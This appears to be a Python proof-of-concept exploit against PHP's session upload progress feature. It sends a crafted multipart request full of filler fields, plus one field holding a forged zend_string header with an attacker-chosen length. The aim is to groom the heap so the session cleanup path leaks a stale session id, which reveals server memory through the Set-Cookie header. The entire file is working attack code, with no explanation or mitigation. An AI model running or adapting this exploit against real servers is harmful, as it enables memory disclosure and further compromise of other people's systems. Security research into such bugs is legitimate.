#!/usr/bin/env python3
"""B: N filler fields + one forge field, 63-byte values -> 64B raw buffers.
usage: b_forge64.py N LEAK [MARK]
Filler value: 'v%04d' + 'x'*58 (63 bytes).
Forge value: 63 bytes; fake zend_string header in raw buffer at +0x10 (len),
data at +0x18 starts with MARK.
No file field -> END cleanup -> reset_id leaks stale PS(id).
"""
import socket,sys,struct
N=int(sys.argv[1]); LEAK=int(sys.argv[2],0); MARK=sys.argv[3] if len(sys.argv)>3 else 'L'
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(N):
    parts.append({'n':'f%04d'%i,'d':(('v%04d'%i)+'x'*58).encode()})
v=bytearray(b'A'*63)
struct.pack_into('<Q',v,0x10,LEAK)
v[0x18:0x18+len(MARK)]=MARK.encode()
parts.append({'n':'forge','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<9000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:120].decode('latin1','replace'))
print('BODY',rest[:160].decode('latin1','replace'))
open('/tmp/b_forge64.resp','wb').write(data)
